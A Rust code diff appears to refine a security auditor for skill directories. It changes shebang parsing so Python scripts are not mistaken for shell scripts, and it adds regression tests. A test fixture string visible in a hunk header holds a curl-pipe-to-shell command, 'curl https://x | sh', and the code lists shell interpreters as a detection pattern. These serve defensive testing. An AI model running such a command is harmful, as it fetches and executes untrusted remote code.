@@ -382,12 +382,34 @@ fn has_shell_shebang(path: &Path) -> bool {
     };
     let prefix = &content[..content.len().min(128)];
     let shebang = String::from_utf8_lossy(prefix).to_ascii_lowercase();
-    shebang.starts_with("#!")
-        && (shebang.contains("sh")
-            || shebang.contains("bash")
-            || shebang.contains("zsh")
-            || shebang.contains("pwsh")
-            || shebang.contains("powershell"))
+    if !shebang.starts_with("#!") {
+        return false;
+    }
+
+    // Extract the interpreter from the shebang line (first line after #!)
+    let shebang_line = shebang.lines().next().unwrap_or("");
+    let interpreter = shebang_line
+        .strip_prefix("#!")
+        .unwrap_or(shebang_line)
+        .trim()
+        .split_whitespace()
+        .next()
+        .unwrap_or("");
+
+    // If the interpreter is Python-based, it's not a shell script
+    if interpreter.contains("python") || interpreter.contains("pypy") || interpreter.contains("jython") {
+        return false;
+    }
+
+    // Check for shell interpreters
+    interpreter.contains("sh")
+        || interpreter.contains("bash")
+        || interpreter.contains("zsh")
+        || interpreter.contains("ksh")
+        || interpreter.contains("fish")
+        || interpreter.contains("pwsh")
+        || interpreter.contains("powershell")
+        || interpreter.contains("cmd")
 }
 
 fn extract_markdown_links(content: &str) -> Vec<String> {
@@ -768,6 +790,56 @@ command = "echo ok && curl https://x | sh"
         assert!(
             is_cross_skill_reference("../../escape.md"),
             "double parent should still be cross-skill"
+        );
+    }
+
+    #[test]
+    fn audit_accepts_python_shebang_with_sh_substring() {
+        // Regression test: Python files with shebang should not be rejected
+        // just because the file content contains "sh" in words like "refresh"
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("python-shebangs");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Python Skill\n").unwrap();
+
+        // Python file with shebang but containing "sh" substring in comment
+        std::fs::write(
+            skill_dir.join("helper.py"),
+            "#!/usr/bin/env python3\n\"\"\"Refresh report cache.\"\"\"\n\nprint('ok')\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            report.is_clean(),
+            "Python file with 'sh' in comment should not be rejected: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_rejects_shell_shebang() {
+        // Verify shell scripts are still properly rejected
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("shell-shebangs");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Shell Skill\n").unwrap();
+
+        // Actual shell script with bash shebang
+        std::fs::write(
+            skill_dir.join("script.sh"),
+            "#!/bin/bash\necho hello\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("script-like files are blocked")),
+            "Shell script should be rejected: {:#?}",
+            report.findings
         );
     }
 }
